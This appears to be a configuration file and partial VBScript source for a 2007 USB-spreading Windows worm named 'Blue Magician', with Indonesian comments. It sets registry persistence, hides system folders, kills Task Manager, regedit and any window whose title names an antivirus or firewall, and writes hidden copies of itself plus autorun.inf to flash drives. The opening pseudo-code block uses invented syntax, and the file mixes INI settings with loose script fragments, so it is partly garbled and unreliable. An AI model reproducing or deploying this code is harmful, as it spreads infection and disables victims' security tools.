# Main function declaration
<# DECLARATION #>
     { # Include <Registry.Vndy>}
     { # Include <Wincaption.Vndy>}
     { # Include <Vrlog.dll>}
         Global declare function main()
             { gets (paramsystem{Sys32}) };
             { load (primary(binarydata;<maxdim=37426>)) }
             { compile (subrountine<extract<compress<encrypt;256bit)}
             { write (EXE;useicon;noversion;maxbyte=80kb)}
     { end }
# End function declaration

[DATA]
# Masukan semua informasi
ProgName =  Blue Magician
Version = 1.0 RC 1 
TimeReleased = 2007
Creator = simPATizone
InitialName = Telkomsel
Organization = Telkomsel
Directions = Education or File Breaker?
EXEName =  simPATi.exe
Plugins = {Telkomsel.VBA}

[FILES]
# Masukan nama file dan folder yang akan digunakan
Folder = {Sys32}
FolderBase = Telkomsel
FileName1 = simPATi.exe
FileName2 = KArtu As.exe
FileName3 = Terry.exe
FileName4 = Debbio.exe
FileName5 = Ophia.exe

[STARTUP]
# Masukan nama entry startup registry
StartupFolderFile = Telkomsel Windows.exe
Userinit = True
Shell = True
AutorunCMD = True
ActiveSafeMode = True

[REGISTRY]
# Pengaturan registry. Maksimum 50 Registry Entry
Regset1 = HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Corona.exe;CK
Regset2 = HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Blue Warrior.exe;CK
Regset3 = HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SimPaTie.exe;CK

[TASK]
# Pengaturan tugas. Untuk informasi, buka help
AppRestrict = cmd.exe;taskmgr.exe;regedit.exe;msconfig.exe
AppKill = cmd.exe;taskmgr.exe;regedit.exe;msconfig.exe
BackupSystemFile = True
HideRootFolder = True
HideSystem32Folder = True
AppKillInterval = 30000
InfectorInterval = 30000
ShellVirNewInterval = 10000
InfectionProgramFilesFolder = True
MakeAutorunFile = True
ProgActiveMonitor = True
SetCopyAndStartup = True

[SPREADING]
ReplicationAble = True

'//--Buat Infector jika ternyata Drivetypr 1 atau 2. Atau A:\--//
set tf=fs.getfile(flashdrive.path &"\k4l0n6.dll.vbs ")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\Telkomsel.vbs ",2,true)
tf.write rekursif
tf.close
set tf=fs.getfile(flashdrive.path &"\Telkomsel.dll.vbs ")
tf.attributes = 39

'//--Buat Atorun.inf yang teks-nya tadi sudah disiapkan (Auto Setup Information)--//
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write isi
tf.close
set tf = fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next

[MESSAGE]
# Masukan Pesan yang akan ditampilkan
FirstLaunch = How many tears must be shed?
MessageTitle = Hello Friends...
MainMessage = How many tears must be shed? I was frightened by the long, long nights. I prayed to the distant stars. Round and round in looping time. For we want to grow stronger and stronger. We still  look up to the high skies today

MessageFileName = For we want to grow stronger and stronger.text

[WINCAPTION]
# Masukan caption window yang akan diubah
Untitled - Notepad = No One....!!!
Run = Where do you want to go...???
Recycle Bin = Fortress
My Computer = My Castle
Registry Editor = Developer....!!!
System Configuration Utility = Researcher....
Command Prompt = Commander...
Disk Defragmenter = Builder....???
Search Results = Spy Agency....???
Control Panel = Destroyer

'//--Manip – Disable klik kanan--//
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "1", "REG_DWORD"

# Daftar window caption yang dilarang. Dipisahkan dengan tag ';'
CaptionToKill = ADMINISTRATOR;ANTIVIRUS;AUTORUNS;BITDEFENDER;CONNECTIONS;DELETE;EXPLORER;FIREFOX;FIREWALL;FOLDER;NORMALIZER;COMMAND;LICENSE;PCMAV;

[CUSTOM]
# Pengaturan tambahan
HideOnRun = True
HideFromTaskManager = True
ProgCaption = Default